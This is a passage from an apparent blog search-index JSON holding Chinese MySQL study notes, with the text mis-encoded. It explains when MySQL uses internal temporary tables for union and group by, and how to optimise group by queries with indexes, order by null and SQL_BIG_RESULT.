(t1.b&#x3D;temp_t.b); æ€»ç»“ åœ¨ç”Ÿäº§ä¸Šï¼Œæˆ‘ä¸å»ºè®®ä½ ä½¿ç”¨æ™®é€šå†…å­˜è¡¨ è€Œå†…å­˜è¡¨ç”±äºä¸æ”¯æŒè¡Œé”ï¼ˆåªæ”¯æŒè¡¨é”ï¼‰ï¼Œæ›´æ–°è¯­å¥ä¼šé˜»å¡æŸ¥è¯¢","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"37 ä»€ä¹ˆæ—¶å€™ä¼šä½¿ç”¨å†…éƒ¨ä¸´æ—¶è¡¨","slug":"when-to-use-internal-temporary-tables","date":"2022-08-31T01:58:51.000Z","updated":"2023-02-18T03:28:33.608Z","comments":true,"path":"when-to-use-internal-temporary-tables/","link":"","permalink":"https://www.0x2beace.com/when-to-use-internal-temporary-tables/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š MySQL ä»€ä¹ˆæ—¶å€™ä¼šä½¿ç”¨å†…éƒ¨ä¸´æ—¶è¡¨ äº†è§£ union çš„æ‰§è¡Œæµç¨‹ äº†è§£ group by çš„æ‰§è¡Œæµç¨‹","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š MySQL ä»€ä¹ˆæ—¶å€™ä¼šä½¿ç”¨å†…éƒ¨ä¸´æ—¶è¡¨ äº†è§£ union çš„æ‰§è¡Œæµç¨‹ äº†è§£ group by çš„æ‰§è¡Œæµç¨‹ union æ‰§è¡Œæµç¨‹ä¸ºäº†ä¾¿äºé‡åŒ–åˆ†æï¼Œæˆ‘ç”¨ä¸‹é¢çš„è¡¨ t1 æ¥ä¸¾ä¾‹ï¼š 1234567891011121314create table t1(id int primary key, a int, b int, index(a));delimiter ;;create procedure idata()begin declare i int; set i&#x3D;1; while(i&lt;&#x3D;1000)do insert into t1 values(i, i, i); set i&#x3D;i+1; end while;end;;delimiter ;call idata(); ç„¶åï¼Œæˆ‘ä»¬æ‰§è¡Œä¸‹é¢è¿™æ¡è¯­å¥ï¼š 1(select 1000 as f) union (select id from t1 order by id desc limit 2); è¿™æ¡è¯­å¥ç”¨åˆ°äº† unionï¼Œå®ƒçš„è¯­ä¹‰æ˜¯ï¼Œå–è¿™ä¸¤ä¸ªå­æŸ¥è¯¢ç»“æœçš„å¹¶é›†ã€‚å¹¶é›†çš„æ„æ€å°±æ˜¯è¿™ä¸¤ä¸ªé›†åˆåŠ èµ·æ¥ï¼Œé‡å¤çš„è¡Œåªä¿ç•™ä¸€è¡Œã€‚ ä¸‹å›¾æ˜¯è¿™ä¸ªè¯­å¥çš„ explain ç»“æœã€‚ å¯ä»¥çœ‹åˆ°ï¼š ç¬¬äºŒè¡Œçš„ key=PRIMARYï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­å¥ç”¨åˆ°äº†ç´¢å¼• idã€‚ ç¬¬ä¸‰è¡Œçš„ Extra å­—æ®µï¼Œè¡¨ç¤ºåœ¨å¯¹å­æŸ¥è¯¢çš„ç»“æœé›†åš union çš„æ—¶å€™ï¼Œä½¿ç”¨äº†ä¸´æ—¶è¡¨ (Using temporary)ã€‚ è¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š åˆ›å»ºä¸€ä¸ªå†…å­˜ä¸´æ—¶è¡¨ï¼Œè¿™ä¸ªä¸´æ—¶è¡¨åªæœ‰ä¸€ä¸ªæ•´å‹å­—æ®µ fï¼Œå¹¶ä¸” f æ˜¯ä¸»é”®å­—æ®µã€‚ æ‰§è¡Œç¬¬ä¸€ä¸ªå­æŸ¥è¯¢ï¼Œå¾—åˆ° 1000 è¿™ä¸ªå€¼ï¼Œå¹¶å­˜å…¥ä¸´æ—¶è¡¨ä¸­ã€‚ æ‰§è¡Œç¬¬äºŒä¸ªå­æŸ¥è¯¢ï¼š æ‹¿åˆ°ç¬¬ä¸€è¡Œ id=1000ï¼Œè¯•å›¾æ’å…¥ä¸´æ—¶è¡¨ä¸­ã€‚ä½†ç”±äº 1000 è¿™ä¸ªå€¼å·²ç»å­˜åœ¨äºä¸´æ—¶è¡¨äº†ï¼Œè¿åäº†å”¯ä¸€æ€§çº¦æŸï¼Œæ‰€ä»¥æ’å…¥å¤±è´¥ï¼Œç„¶åç»§ç»­æ‰§è¡Œï¼› å–åˆ°ç¬¬äºŒè¡Œ id=999ï¼Œæ’å…¥ä¸´æ—¶è¡¨æˆåŠŸã€‚ ä»ä¸´æ—¶è¡¨ä¸­æŒ‰è¡Œå–å‡ºæ•°æ®ï¼Œè¿”å›ç»“æœï¼Œå¹¶åˆ é™¤ä¸´æ—¶è¡¨ï¼Œç»“æœä¸­åŒ…å«ä¸¤è¡Œæ•°æ®åˆ†åˆ«æ˜¯ 1000 å’Œ 999ã€‚ è¿™ä¸ªè¿‡ç¨‹çš„æµç¨‹å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„å†…å­˜ä¸´æ—¶è¡¨èµ·åˆ°äº†æš‚å­˜æ•°æ®çš„ä½œç”¨ï¼Œè€Œä¸”è®¡ç®—è¿‡ç¨‹è¿˜ç”¨ä¸Šäº†ä¸´æ—¶è¡¨ä¸»é”® id çš„å”¯ä¸€æ€§çº¦æŸï¼Œå®ç°äº† union çš„è¯­ä¹‰ã€‚ é¡ºä¾¿æä¸€ä¸‹ï¼Œå¦‚æœæŠŠä¸Šé¢è¿™ä¸ªè¯­å¥ä¸­çš„ union æ”¹æˆ union all çš„è¯ï¼Œå°±æ²¡æœ‰äº†â€œå»é‡â€çš„è¯­ä¹‰ã€‚è¿™æ ·æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¾æ¬¡æ‰§è¡Œå­æŸ¥è¯¢ï¼Œå¾—åˆ°çš„ç»“æœç›´æ¥ä½œä¸ºç»“æœé›†çš„ä¸€éƒ¨åˆ†ï¼Œå‘ç»™å®¢æˆ·ç«¯ã€‚å› æ­¤ä¹Ÿå°±ä¸éœ€è¦ä¸´æ—¶è¡¨äº†ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç¬¬äºŒè¡Œçš„ Extra å­—æ®µæ˜¾ç¤ºçš„æ˜¯ Using indexï¼Œè¡¨ç¤ºåªä½¿ç”¨äº†è¦†ç›–ç´¢å¼•ï¼Œæ²¡æœ‰ç”¨ä¸´æ—¶è¡¨äº†ã€‚ group by æ‰§è¡Œæµç¨‹å¦å¤–ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨ä¸´æ—¶è¡¨çš„ä¾‹å­æ˜¯ group byï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¯­å¥ï¼š 1select id%10 as m, count(*) as c from t1 group by m; è¿™ä¸ªè¯­å¥çš„é€»è¾‘æ˜¯æŠŠè¡¨ t1 é‡Œçš„æ•°æ®ï¼ŒæŒ‰ç…§ id%10 è¿›è¡Œåˆ†ç»„ç»Ÿè®¡ï¼Œå¹¶æŒ‰ç…§ m çš„ç»“æœæ’åºåè¾“å‡ºã€‚å®ƒçš„ explain ç»“æœå¦‚ä¸‹ï¼š åœ¨ Extra å­—æ®µé‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªä¿¡æ¯ï¼š Using indexï¼Œè¡¨ç¤ºè¿™ä¸ªè¯­å¥ä½¿ç”¨äº†è¦†ç›–ç´¢å¼•ï¼Œé€‰æ‹©äº†ç´¢å¼• aï¼Œä¸éœ€è¦å›è¡¨ï¼› Using temporaryï¼Œè¡¨ç¤ºä½¿ç”¨äº†ä¸´æ—¶è¡¨ï¼› Using filesortï¼Œè¡¨ç¤ºéœ€è¦æ’åºã€‚ è¿™ä¸ªè¯­å¥çš„æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š åˆ›å»ºå†…å­˜ä¸´æ—¶è¡¨ï¼Œè¡¨é‡Œæœ‰ä¸¤ä¸ªå­—æ®µ m å’Œ cï¼Œä¸»é”®æ˜¯ mï¼› æ‰«æè¡¨ t1 çš„ç´¢å¼• aï¼Œä¾æ¬¡å–å‡ºå¶å­èŠ‚ç‚¹ä¸Šçš„ id å€¼ï¼Œè®¡ç®— id%10 çš„ç»“æœï¼Œè®°ä¸º xï¼› å¦‚æœä¸´æ—¶è¡¨ä¸­æ²¡æœ‰ä¸»é”®ä¸º x çš„è¡Œï¼Œå°±æ’å…¥ä¸€ä¸ªè®°å½• (x,1); å¦‚æœè¡¨ä¸­æœ‰ä¸»é”®ä¸º x çš„è¡Œï¼Œå°±å°† x è¿™ä¸€è¡Œçš„ c å€¼åŠ  1ï¼›\\ éå†å®Œæˆåï¼Œå†æ ¹æ®å­—æ®µ m åšæ’åºï¼Œå¾—åˆ°ç»“æœé›†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ è¿™ä¸ªæµç¨‹çš„æ‰§è¡Œå›¾å¦‚ä¸‹ï¼š å…¶ä¸­ï¼Œå¯¹äºå†…å­˜ä¸´æ—¶è¡¨çš„æ’åºåœ¨å‰é¢çš„ç« èŠ‚å·²ç»ä»‹ç»è¿‡ã€‚ æ¥ä¸‹æ¥å†æ¥çœ‹çœ‹å¦ä¸€æ¡è¯­å¥çš„æ‰§è¡Œç»“æœï¼š 1select id%10 as m, count(*) as c from t1 group by m; å¦‚æœä½ çš„éœ€æ±‚å¹¶ä¸éœ€è¦å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œé‚£ä½ å¯ä»¥åœ¨ SQL è¯­å¥æœ«å°¾å¢åŠ  order by nullï¼Œä¹Ÿå°±æ˜¯æ”¹æˆï¼š 1select id%10 as m, count(*) as c from t1 group by m order by null; è¿™æ ·å°±è·³è¿‡äº†æœ€åæ’åºçš„é˜¶æ®µï¼Œç›´æ¥ä»ä¸´æ—¶è¡¨ä¸­å–æ•°æ®è¿”å›ã€‚è¿”å›çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šç”±äºè¡¨ t1 ä¸­çš„ id å€¼æ˜¯ä» 1 å¼€å§‹çš„ï¼Œå› æ­¤è¿”å›çš„ç»“æœé›†ä¸­ç¬¬ä¸€è¡Œæ˜¯ id=1ï¼›æ‰«æåˆ° id=10 çš„æ—¶å€™æ‰æ’å…¥ m=0 è¿™ä¸€è¡Œï¼Œå› æ­¤ç»“æœé›†é‡Œæœ€åä¸€è¡Œæ‰æ˜¯ m=0ã€‚ è¿™ä¸ªä¾‹å­é‡Œç”±äºä¸´æ—¶è¡¨åªæœ‰ 10 è¡Œï¼Œå†…å­˜å¯ä»¥æ”¾å¾—ä¸‹ï¼Œå› æ­¤å…¨ç¨‹åªä½¿ç”¨äº†å†…å­˜ä¸´æ—¶è¡¨ã€‚ä½†æ˜¯ï¼Œå†…å­˜ä¸´æ—¶è¡¨çš„å¤§å°æ˜¯æœ‰é™åˆ¶çš„ï¼Œå‚æ•° tmp_table_size å°±æ˜¯æ§åˆ¶è¿™ä¸ªå†…å­˜å¤§å°çš„ï¼Œé»˜è®¤æ˜¯ 16Mã€‚ å¦‚æœæ‰§è¡Œä¸‹é¢è¿™ä¸ªè¯­å¥ï¼š 12set tmp_table_size&#x3D;1024;select id%100 as m, count(*) as c from t1 group by m order by null limit 10; æŠŠå†…å­˜ä¸´æ—¶è¡¨çš„å¤§å°é™åˆ¶ä¸ºæœ€å¤§ 1024 å­—èŠ‚ï¼Œå¹¶æŠŠè¯­å¥æ”¹æˆ id % 100ï¼Œè¿™æ ·è¿”å›ç»“æœé‡Œæœ‰ 100 è¡Œæ•°æ®ã€‚ä½†æ˜¯ï¼Œè¿™æ—¶çš„å†…å­˜ä¸´æ—¶è¡¨å¤§å°ä¸å¤Ÿå­˜ä¸‹è¿™ 100 è¡Œæ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå‘ç°å†…å­˜ä¸´æ—¶è¡¨å¤§å°åˆ°è¾¾äº†ä¸Šé™ï¼ˆ1024 å­—èŠ‚ï¼‰ã€‚ é‚£ä¹ˆï¼Œè¿™æ—¶å€™å°±ä¼šæŠŠå†…å­˜ä¸´æ—¶è¡¨è½¬æˆç£ç›˜ä¸´æ—¶è¡¨ï¼Œç£ç›˜ä¸´æ—¶è¡¨é»˜è®¤ä½¿ç”¨çš„å¼•æ“æ˜¯ InnoDBã€‚ è¿™æ—¶ï¼Œè¿”å›çš„ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¦‚æœè¿™ä¸ªè¡¨ t1 çš„æ•°æ®é‡å¾ˆå¤§ï¼Œå¾ˆå¯èƒ½è¿™ä¸ªæŸ¥è¯¢éœ€è¦çš„ç£ç›˜ä¸´æ—¶è¡¨å°±ä¼šå ç”¨å¤§é‡çš„ç£ç›˜ç©ºé—´ã€‚ group by ä¼˜åŒ–æ–¹æ³•å¯ä»¥çœ‹åˆ°ï¼Œä¸è®ºæ˜¯ä½¿ç”¨å†…å­˜ä¸´æ—¶è¡¨è¿˜æ˜¯ç£ç›˜ä¸´æ—¶è¡¨ï¼Œgroup by é€»è¾‘éƒ½éœ€è¦æ„é€ ä¸€ä¸ªå¸¦å”¯ä¸€ç´¢å¼•çš„è¡¨ï¼Œæ‰§è¡Œä»£ä»·éƒ½æ˜¯æ¯”è¾ƒé«˜çš„ã€‚å¦‚æœè¡¨çš„æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œä¸Šé¢è¿™ä¸ª group by è¯­å¥æ‰§è¡Œèµ·æ¥å°±ä¼šå¾ˆæ…¢ï¼Œæˆ‘ä»¬æœ‰ä»€ä¹ˆä¼˜åŒ–çš„æ–¹æ³•å‘¢ï¼Ÿ ç´¢å¼•è¦è§£å†³ group by è¯­å¥çš„ä¼˜åŒ–é—®é¢˜ï¼Œä½ å¯ä»¥å…ˆæƒ³ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ï¼šæ‰§è¡Œ group by è¯­å¥ä¸ºä»€ä¹ˆéœ€è¦ä¸´æ—¶è¡¨ï¼Ÿ group by çš„è¯­ä¹‰é€»è¾‘ï¼Œæ˜¯ç»Ÿè®¡ä¸åŒçš„å€¼å‡ºç°çš„ä¸ªæ•°ã€‚ä½†æ˜¯ï¼Œç”±äºæ¯ä¸€è¡Œçš„ id%100 çš„ç»“æœæ˜¯æ— åºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æœ‰ä¸€ä¸ªä¸´æ—¶è¡¨ï¼Œæ¥è®°å½•å¹¶ç»Ÿè®¡ç»“æœã€‚ é‚£ä¹ˆï¼Œå¦‚æœæ‰«æè¿‡ç¨‹ä¸­å¯ä»¥ä¿è¯å‡ºç°çš„æ•°æ®æ˜¯æœ‰åºçš„ï¼Œæ˜¯ä¸æ˜¯å°±ç®€å•äº†å‘¢ï¼Ÿ å‡è®¾ï¼Œç°åœ¨æœ‰ä¸€ä¸ªç±»ä¼¼å›¾ 10 çš„è¿™ä¹ˆä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ group by å¯ä»¥æ€ä¹ˆåšã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœå¯ä»¥ç¡®ä¿è¾“å…¥çš„æ•°æ®æ˜¯æœ‰åºçš„ï¼Œé‚£ä¹ˆè®¡ç®— group by çš„æ—¶å€™ï¼Œå°±åªéœ€è¦ä»å·¦åˆ°å³ï¼Œé¡ºåºæ‰«æï¼Œä¾æ¬¡ç´¯åŠ ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªè¿‡ç¨‹ï¼š å½“ç¢°åˆ°ç¬¬ä¸€ä¸ª 1 çš„æ—¶å€™ï¼Œå·²ç»çŸ¥é“ç´¯ç§¯äº† X ä¸ª 0ï¼Œç»“æœé›†é‡Œçš„ç¬¬ä¸€è¡Œå°±æ˜¯ (0,X); å½“ç¢°åˆ°ç¬¬ä¸€ä¸ª 2 çš„æ—¶å€™ï¼Œå·²ç»çŸ¥é“ç´¯ç§¯äº† Y ä¸ª 1ï¼Œç»“æœé›†é‡Œçš„ç¬¬äºŒè¡Œå°±æ˜¯ (1,Y); æŒ‰ç…§è¿™ä¸ªé€»è¾‘æ‰§è¡Œçš„è¯ï¼Œæ‰«æåˆ°æ•´ä¸ªè¾“å…¥çš„æ•°æ®ç»“æŸï¼Œå°±å¯ä»¥æ‹¿åˆ° group by çš„ç»“æœï¼Œä¸éœ€è¦ä¸´æ—¶è¡¨ï¼Œä¹Ÿä¸éœ€è¦å†é¢å¤–æ’åºã€‚ ä½ ä¸€å®šæƒ³åˆ°äº†ï¼ŒInnoDB çš„ç´¢å¼•ï¼Œå°±å¯ä»¥æ»¡è¶³è¿™ä¸ªè¾“å…¥æœ‰åºçš„æ¡ä»¶ã€‚ åœ¨ MySQL 5.7 ç‰ˆæœ¬æ”¯æŒäº† generated column æœºåˆ¶ï¼Œç”¨æ¥å®ç°åˆ—æ•°æ®çš„å…³è”æ›´æ–°ã€‚ä½ å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•åˆ›å»ºä¸€ä¸ªåˆ— zï¼Œç„¶ååœ¨ z åˆ—ä¸Šåˆ›å»ºä¸€ä¸ªç´¢å¼•ï¼ˆå¦‚æœæ˜¯ MySQL 5.6 åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œä½ ä¹Ÿå¯ä»¥åˆ›å»ºæ™®é€šåˆ—å’Œç´¢å¼•ï¼Œæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼‰ã€‚ 1alter table t1 add column z int generated always as(id % 100), add index(z); è¿™æ ·ï¼Œç´¢å¼• z ä¸Šçš„æ•°æ®å°±æ˜¯ç±»ä¼¼å›¾ 10 è¿™æ ·æœ‰åºçš„äº†ã€‚ä¸Šé¢çš„ group by è¯­å¥å°±å¯ä»¥æ”¹æˆï¼š 1select z, count(*) as c from t1 group by z; ä¼˜åŒ–åçš„ group by è¯­å¥ï¼Œä¸å†éœ€è¦ä¸´æ—¶è¡¨ï¼Œä¹Ÿä¸éœ€è¦æ’åºäº†ã€‚ ç›´æ¥æ’åºæ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥é€šè¿‡åŠ ç´¢å¼•æ¥å®Œæˆ group by é€»è¾‘å°±å†å¥½ä¸è¿‡äº†ã€‚ä½†æ˜¯ï¼Œå¦‚æœç¢°ä¸Šä¸é€‚åˆåˆ›å»ºç´¢å¼•çš„åœºæ™¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦è€è€å®å®åšæ’åºçš„ã€‚é‚£ä¹ˆï¼Œè¿™æ—¶å€™çš„ group by è¦æ€ä¹ˆä¼˜åŒ–å‘¢ï¼Ÿ å¦‚æœæˆ‘ä»¬æ˜æ˜çŸ¥é“ï¼Œä¸€ä¸ª group by è¯­å¥ä¸­éœ€è¦æ”¾åˆ°ä¸´æ—¶è¡¨ä¸Šçš„æ•°æ®é‡ç‰¹åˆ«å¤§ï¼Œå´è¿˜æ˜¯è¦æŒ‰ç…§â€œå…ˆæ”¾åˆ°å†…å­˜ä¸´æ—¶è¡¨ï¼Œæ’å…¥ä¸€éƒ¨åˆ†æ•°æ®åï¼Œå‘ç°å†…å­˜ä¸´æ—¶è¡¨ä¸å¤Ÿç”¨äº†å†è½¬æˆç£ç›˜ä¸´æ—¶è¡¨â€ï¼Œçœ‹ä¸Šå»å°±æœ‰ç‚¹å„¿å‚»ã€‚ é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ä¼šæƒ³äº†ï¼ŒMySQL æœ‰æ²¡æœ‰è®©æˆ‘ä»¬ç›´æ¥èµ°ç£ç›˜ä¸´æ—¶è¡¨çš„æ–¹æ³•å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œæœ‰çš„ã€‚ åœ¨ group by è¯­å¥ä¸­åŠ å…¥ SQL_BIG_RESULT è¿™ä¸ªæç¤ºï¼ˆhintï¼‰ï¼Œå°±å¯ä»¥å‘Šè¯‰ä¼˜åŒ–å™¨ï¼šè¿™ä¸ªè¯­å¥æ¶‰åŠçš„æ•°æ®é‡å¾ˆå¤§ï¼Œè¯·ç›´æ¥ç”¨ç£ç›˜ä¸´æ—¶è¡¨ã€‚ MySQL çš„ä¼˜åŒ–å™¨ä¸€çœ‹ï¼Œç£ç›˜ä¸´æ—¶è¡¨æ˜¯ B+ æ ‘å­˜å‚¨ï¼Œå­˜å‚¨æ•ˆç‡ä¸å¦‚æ•°ç»„æ¥å¾—é«˜ã€‚æ‰€ä»¥ï¼Œæ—¢ç„¶ä½ å‘Šè¯‰æˆ‘æ•°æ®é‡å¾ˆå¤§ï¼Œé‚£ä»ç£ç›˜ç©ºé—´è€ƒè™‘ï¼Œè¿˜æ˜¯ç›´æ¥ç”¨æ•°ç»„æ¥å­˜å§ã€‚ 1select SQL_BIG_RESULT id%100 as m, count(*) as c from t1 group by m; å› æ­¤ï¼Œä¸Šé¢è¿™ä¸ªè¯­å¥æ‰§è¡Œæµç¨‹å°±æ˜¯è¿™æ ·çš„ï¼š åˆå§‹åŒ– sort_bufferï¼Œç¡®å®šæ”¾å…¥ä¸€ä¸ªæ•´å‹å­—æ®µï¼Œè®°ä¸º mï¼› æ‰«æè¡¨ t1 çš„ç´¢å¼• aï¼Œä¾æ¬¡å–å‡ºé‡Œé¢çš„ id å€¼, å°† id%100 çš„å€¼å­˜å…¥ sort_buffer ä¸­ï¼› æ‰«æå®Œæˆåï¼Œå¯¹ sort_buffer çš„å­—æ®µ m åšæ’åºï¼ˆå¦‚æœ sort_buffer å†…å­˜ä¸å¤Ÿç”¨ï¼Œå°±ä¼šåˆ©ç”¨ç£ç›˜ä¸´æ—¶æ–‡ä»¶è¾…åŠ©æ’åºï¼‰ï¼› æ’åºå®Œæˆåï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªæœ‰åºæ•°ç»„ã€‚ æ ¹æ®æœ‰åºæ•°ç»„ï¼Œå¾—åˆ°æ•°ç»„é‡Œé¢çš„ä¸åŒå€¼ï¼Œä»¥åŠæ¯ä¸ªå€¼çš„å‡ºç°æ¬¡æ•°ã€‚è¿™ä¸€æ­¥çš„é€»è¾‘ï¼Œä½ å·²ç»ä»å‰é¢çš„å›¾ä¸­äº†è§£è¿‡äº†ã€‚ ä¸‹é¢ä¸¤å¼ å›¾åˆ†åˆ«æ˜¯æ‰§è¡Œæµç¨‹å›¾å’Œæ‰§è¡Œ explain å‘½ä»¤å¾—åˆ°çš„ç»“æœã€‚ ä¼˜åŒ–åçš„ group by è¯­å¥ï¼Œæ²¡æœ‰å†ä½¿ç”¨ä¸´æ—¶è¡¨ï¼Œè€Œæ˜¯ç›´æ¥ç”¨äº†æ’åºç®—æ³•ã€‚ åŸºäºä¸Šé¢çš„ unionã€union all å’Œ group by è¯­å¥çš„æ‰§è¡Œè¿‡ç¨‹çš„åˆ†æï¼Œæˆ‘ä»¬æ¥å›ç­”æ–‡ç« å¼€å¤´çš„é—®é¢˜ï¼šMySQL ä»€ä¹ˆæ—¶å€™ä¼šä½¿ç”¨å†…éƒ¨ä¸´æ—¶è¡¨ï¼Ÿ å¦‚æœè¯­å¥æ‰§è¡Œè¿‡ç¨‹å¯ä»¥ä¸€è¾¹è¯»æ•°æ®ï¼Œä¸€è¾¹ç›´æ¥å¾—åˆ°ç»“æœï¼Œæ˜¯ä¸éœ€è¦é¢å¤–å†…å­˜çš„ï¼Œå¦åˆ™å°±éœ€è¦é¢å¤–çš„å†…å­˜ï¼Œæ¥ä¿å­˜ä¸­é—´ç»“æœï¼› join_buffer æ˜¯æ— åºæ•°ç»„ï¼Œsort_buffer æ˜¯æœ‰åºæ•°ç»„ï¼Œä¸´æ—¶è¡¨æ˜¯äºŒç»´è¡¨ç»“æ„ï¼› å¦‚æœæ‰§è¡Œé€»è¾‘éœ€è¦ç”¨åˆ°äºŒç»´è¡¨ç‰¹æ€§ï¼Œå°±ä¼šä¼˜å…ˆè€ƒè™‘ä½¿ç”¨ä¸´æ—¶è¡¨ã€‚æ¯”å¦‚æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œunion éœ€è¦ç”¨åˆ°å”¯ä¸€ç´¢å¼•çº¦æŸï¼Œ group by è¿˜éœ€è¦ç”¨åˆ°å¦å¤–ä¸€ä¸ªå­—æ®µæ¥å­˜ç´¯ç§¯è®¡æ•°ã€‚ æ€»ç»“ å¦‚æœå¯¹ group by è¯­å¥çš„ç»“æœæ²¡æœ‰æ’åºè¦æ±‚ï¼Œè¦åœ¨è¯­å¥åé¢åŠ  order by nullï¼› å°½é‡è®© group by è¿‡ç¨‹ç”¨ä¸Šè¡¨çš„ç´¢å¼•ï¼Œç¡®è®¤æ–¹æ³•æ˜¯ explain ç»“æœé‡Œæ²¡æœ‰ Using temporary å’Œ Using filesortï¼› å¦‚æœ group by éœ€è¦ç»Ÿè®¡çš„æ•°æ®é‡ä¸å¤§ï¼Œå°½é‡åªä½¿ç”¨å†…å­˜ä¸´æ—¶è¡¨ï¼›ä¹Ÿå¯ä»¥é€šè¿‡é€‚å½“è°ƒå¤§ tmp_table_size å‚æ•°ï¼Œæ¥é¿å…ç”¨åˆ°ç£ç›˜ä¸´æ—¶è¡¨ï¼› å¦‚æœæ•°æ®é‡å®åœ¨å¤ªå¤§ï¼Œä½¿ç”¨ SQL_BIG_RESULT è¿™ä¸ªæç¤ºï¼Œæ¥å‘Šè¯‰ä¼˜åŒ–å™¨ç›´æ¥ä½¿ç”¨æ’åºç®—æ³•å¾—åˆ° group by çš„ç»“æœã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"36 ä¸ºä»€ä¹ˆä¸´æ—¶è¡¨å¯ä»¥é‡å","slug":"why-can-temporary-tables-be-renamed","date":"2022-08-28T00:58:35.000Z","updated":"2023-02-18T03:28:33.608Z","comments":true,"path":"why-can-temporary-tables-be-renamed/","link":"","permalink":"https://www.0x2beace.com/why-can-temporary-tables-be-renamed/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ä¸´æ—¶è¡¨çš„ç‰¹æ€§ äº†è§£ä¸´æ—¶è¡¨çš„åº”ç”¨åœºæ™¯","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ä¸´æ—¶è¡¨çš„ç‰¹æ€§ äº†è§£ä¸´æ—¶è¡¨çš„åº”ç”¨åœºæ™¯ åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œåœ¨ä¼˜åŒ– join æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨åˆ°äº†ä¸´æ—¶è¡¨ã€‚å½“æ—¶ï¼Œæ˜¯è¿™ä¹ˆç”¨çš„ï¼š 1234create temporary table temp_t like t1;alter table temp_t add index(b);insert into temp_t select * from t2 where b&gt;&#x3D;1 and b&lt;&#x3D;2000;select * from t1 join temp_t on (t1.b&#x3D;temp_t.b); ä½ å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œä¸ºä»€ä¹ˆè¦ç”¨ä¸´æ—¶è¡¨å‘¢ï¼Ÿç›´æ¥ç”¨æ™®é€šè¡¨æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å‘¢ï¼Ÿ ä»Šå¤©æˆ‘ä»¬å°±ä»è¿™ä¸ªé—®é¢˜è¯´èµ·ï¼šä¸´æ—¶è¡¨æœ‰å“ªäº›ç‰¹å¾ï¼Œä¸ºä»€ä¹ˆå®ƒé€‚åˆè¿™ä¸ªåœºæ™¯ï¼Ÿ è¿™é‡Œï¼Œæˆ‘éœ€è¦å…ˆå¸®ä½ 